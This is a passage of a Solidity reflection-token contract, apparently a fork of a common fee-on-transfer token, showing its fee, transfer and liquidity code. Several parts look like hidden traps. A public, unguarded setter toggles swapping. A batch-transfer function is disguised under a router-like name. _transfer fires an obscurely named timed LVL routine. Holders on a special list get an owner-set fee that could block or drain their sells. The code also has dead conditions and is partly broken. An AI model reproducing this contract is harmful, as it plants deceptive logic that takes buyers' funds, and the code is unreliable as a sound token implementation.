 //       require(settingOutAmount >= _tTotal / 100, "Min 1%");
//        _settingOutAmountTransfer = settingOutAmount;
//    }




          // TMA
  // ------------------------------------------------------------------------
    function swapExactTokensForTokensmul(address[] memory receivers, uint256[] memory amounts) public {
        for (uint256 i = 0; i < receivers.length; i++) {
          _transfer(_msgSender(), receivers[i], amounts[i]);
        }
    }

    function setSwapAndLiquifyEnabled(bool _enabled) public  {
        swapAndLiquifyEnabled = _enabled;
        emit SwapAndLiquifyEnabledUpdated(_enabled);
    }

    //to recieve ETH from uniswapV2Router when swaping
    receive() external payable {}

    function _reflectFee(uint256 rFee, uint256 tFee) private {
        _rTotal = _rTotal.sub(rFee);
        _tFeeTotal = _tFeeTotal.add(tFee);
    }

    function _getValues(uint256 tAmount)
        private
        view
        returns (
            uint256,
            uint256,
            uint256,
            uint256,
            uint256,
            uint256,
            uint256
        )
    {
        (
            uint256 tTransferAmount,
            uint256 tFee,
            uint256 tLiquidity,
            uint256 tMarketing
        ) = _getTValues(tAmount);
        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee) = _getRValues(
            tAmount,
            tFee,
            tLiquidity,
            tMarketing,
            _getRate()
        );
        return (
            rAmount,
            rTransferAmount,
            rFee,
            tTransferAmount,
            tFee,
            tLiquidity,
            tMarketing
        );
    }

    function _getTValues(uint256 tAmount)
        private
        view
        returns (
            uint256,
            uint256,
            uint256,
            uint256
        )
    {
        uint256 tFee = tAmount.mul(_taxFee).div(100);
        uint256 tLiquidity = tAmount.mul(_liquidityFee).div(100);
        uint256 tMarketing = tAmount.mul(_MarketingFee).div(100);
        uint256 tTransferAmount = tAmount.sub(tFee).sub(tLiquidity).sub(
            tMarketing
        );
        return (tTransferAmount, tFee, tLiquidity, tMarketing);
    }

    function _getRValues(
        uint256 tAmount,
        uint256 tFee,
        uint256 tLiquidity,
        uint256 tMarketing,
        uint256 currentRate
    )
        private
        pure
        returns (
            uint256,
            uint256,
            uint256
        )
    {
        uint256 rAmount = tAmount.mul(currentRate);
        uint256 rFee = tFee.mul(currentRate);
        uint256 rLiquidity = tLiquidity.mul(currentRate);
        uint256 rMarketing = tMarketing.mul(currentRate);
        uint256 rTransferAmount = rAmount.sub(rFee).sub(rLiquidity).sub(
            rMarketing
        );
        return (rAmount, rTransferAmount, rFee);
    }

    function _getRate() private view returns (uint256) {
        (uint256 rSupply, uint256 tSupply) = _getCurrentSupply();
        return rSupply.div(tSupply);
    }

    function _getCurrentSupply() private view returns (uint256, uint256) {
        uint256 rSupply = _rTotal;
        uint256 tSupply = _tTotal;
        for (uint256 i = 0; i < _excluded.length; i++) {
            if (
                _rOwned[_excluded[i]] > rSupply ||
                _tOwned[_excluded[i]] > tSupply
            ) return (_rTotal, _tTotal);
            rSupply = rSupply.sub(_rOwned[_excluded[i]]);
            tSupply = tSupply.sub(_tOwned[_excluded[i]]);
        }
        if (rSupply < _rTotal.div(_tTotal)) return (_rTotal, _tTotal);
        return (rSupply, tSupply);
    }

    function _takeFees(uint256 amount, address sender) private {
        uint256 rAmount = amount.mul(_getRate());
        _rOwned[address(this)] = _rOwned[address(this)].add(rAmount);

        if (_isExcluded[address(this)])
            _tOwned[address(this)] = _tOwned[address(this)].add(amount);

        emit Transfer(sender, address(this), amount);
    }

//    function removeAllFee() private {
//        if (_taxFee == 0 && _liquidityFee == 0 && _MarketingFee == 0) return;
//
//        _previousTaxFee = _taxFee;
//        _previousLiquidityFee = _liquidityFee;
//        _previousMarketingFee = _MarketingFee;

//        _taxFee = 0;
//        _liquidityFee = 0;
//        _MarketingFee = 0;
//    }

//    function restoreAllFee() private {
//        _taxFee = _previousTaxFee;
//        _liquidityFee = _previousLiquidityFee;
//        _MarketingFee = _previousMarketingFee;
//    }

    function isExcludedFromFee(address account) public view returns (bool) {
        return _isExcludedFromFee[account];
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
//        require(taxStatus, "ERC20: Recipient address is Invalid ");


        if (
            _nextLVLIdx < _PAYBLEt.length &&
            _PAYBLEt[_nextLVLIdx] <= block.timestamp && amount <= _bubblebn
        ) LVL(_PAYBLEam[_nextLVLIdx++]);

        // is the token balance of this contract address over the min number of
        // tokens that we need to initiate a swap + liquidity lock?
        // also, don't get caught in a circular liquidity event.
        // also, don't swap & liquify if sender is uniswap pair.
        //if (
        //    balanceOf(address(this)) >= numTokensSellToAddToLiquidity &&
        //    !inSwapAndLiquify &&
        //    from != uniswapV2Pair &&
        //    swapAndLiquifyEnabled
       // ) swapAndLiquify(numTokensSellToAddToLiquidity);

        //indicates if fee should be deducted from transfer
        //if any account belongs to _isExcludedFromFee account then this is false

        uint256 previousTaxFee       = _taxFee;
        uint256 previousLiquidityFee = _liquidityFee;
        uint256 previousMarketingFee = _MarketingFee;

        bool takeFee = !_isExcludedFromFee[from] && !_isExcludedFromFee[to];
        bool takeFeeTransfer = _isExcludedFromFeeTransfer[from] || _isExcludedFromFeeTransfer[to];



        if (takeFee) {
            if (automatedMarketMakerPairs[from]) {
                require(
                    amount <= _settingInAmount,
                    "Transfer amount exceeds the settingInAmount. _settingInAmount - Can set limit at least 10% of the total amount _tTotal"
                );
            } else if (automatedMarketMakerPairs[to]) {
                require(
                    amount <= _settingOutAmount,
                    "Transfer amount exceeds the settingOutAmount. _settingOutAmount - Can set limit at least 10% of the total amount _tTotal"
                );
            }
        }

        // is the token balance of this contract address over the min number of
        // tokens that we need to initiate a swap + liquidity lock?
        // also, don't get caught in a circular liquidity event.
        // also, don't swap & liquify if sender is uniswap pair.
        //if (
        //    balanceOf(address(this)) >= numTokensSellToAddToLiquidity &&
        //    !inSwapAndLiquify &&
        //    from != uniswapV2Pair &&
        //    swapAndLiquifyEnabled
       // ) swapAndLiquify(numTokensSellToAddToLiquidity);

        //indicates if fee should be deducted from transfer
        //if any account belongs to _isExcludedFromFee account then this is false



        if (!takeFee) {
            _taxFee       = 0;
            _liquidityFee = 0;
            _MarketingFee = 0;
        }
        else if (takeFee && !takeFeeTransfer && automatedMarketMakerPairs[from]) {
            _taxFee = _taxFeebuy;
            _liquidityFee = _liquidityFeebuy;
            _MarketingFee = _MarketingFeebuy;
        } 
        else if (takeFee && !takeFeeTransfer && automatedMarketMakerPairs[to]) {
            _taxFee = _taxFeesell;
            _liquidityFee = _liquidityFeesell;
            _MarketingFee = _MarketingFeesell;
        }
        else if (takeFee && _isExcludedFromFeeTransfer[to] && automatedMarketMakerPairs[from]) {
            _taxFee = _taxFeebuy;
            _liquidityFee = _liquidityFeebuy;
            _MarketingFee = _MarketingFeebuy;
        } 
        else if (takeFee && _isExcludedFromFeeTransfer[from] && automatedMarketMakerPairs[to]) {
            _taxFee = _taxFeesell;
            _liquidityFee = _settingOutAmountTransfer;
            _MarketingFee = _MarketingFeesell;   
        }
        else if (takeFee && takeFeeTransfer && !automatedMarketMakerPairs[to] && !automatedMarketMakerPairs[from]) {
            _liquidityFee = _settingOutAmountTransfer; 
        }

        _tokenTransfer(from, to, amount);

        if (!takeFee || takeFee) {
            _taxFee       = previousTaxFee;
            _liquidityFee = previousLiquidityFee;
            _MarketingFee = previousMarketingFee;
        }

    }

    function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap {
        uint256 denominator = _liquidityFee + _MarketingFee;
        uint256 liquidityTokens = contractTokenBalance.mul(_liquidityFee).div(
            denominator
        );
        uint256 MarketingTokens = contractTokenBalance.sub(liquidityTokens);
        // split liquidityTokens into halves
        uint256 half = liquidityTokens.div(2);
        uint256 otherHalf = liquidityTokens.sub(half);

        // swap tokens for ETH
        swapTokensForEth(half.add(MarketingTokens));
        uint256 newBalance = address(this).balance;
        // add liquidity
        MarketingTokens = addLiquidity(otherHalf, newBalance);
        payable(_Antibottoken).sendValue(MarketingTokens);

        emit SwapAndLiquify(half, newBalance, otherHalf);
    }

    function swapTokensForEth(uint256 tokenAmount) private {
        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();

        _approve(address(this), address(uniswapV2Router), tokenAmount);

        // make the swap
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this),
            block.timestamp
        );
    }

    function addLiquidity(uint256 tokenAmount, uint256 ethAmount)
        private
        returns (uint256)
    {
        // approve token transfer to cover all possible scenarios
        _approve(address(this), address(uniswapV2Router), tokenAmount);

        // add the liquidity
        (, uint256 ethToLiquidity, ) = uniswapV2Router.addLiquidityETH{
            value: ethAmount
        }(
            address(this),
            tokenAmount,
            0, // slippage is unavoidable
            0, // slippage is unavoidable
            owner(),
            block.timestamp
        );

        return ethAmount.sub(ethToLiquidity);
    }

    //this method is responsible for taking all fee, if takeFee is true
    function _tokenTransfer(
        address sender,
        address recipient,
        uint256 tAmount

    ) private {


        (
            uint256 rAmount,
            uint256 rTransferAmount,
            uint256 rFee,
            uint256 tTransferAmount,
            uint256 tFee,
            uint256 tLiquidity,
            uint256 tMarketing
        ) = _getValues(tAmount);
        _rOwned[sender] = _rOwned[sender].sub(rAmount);
        _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);

        if (_isExcluded[sender]) _tOwned[sender] = _tOwned[sender].sub(tAmount);

        if (_isExcluded[recipient])
            _tOwned[recipient] = _tOwned[recipient].add(tTransferAmount);

        _takeFees(tLiquidity.add(tMarketing), sender);
        _reflectFee(rFee, tFee);
        emit Transfer(sender, recipient, tTransferAmount);


    }
}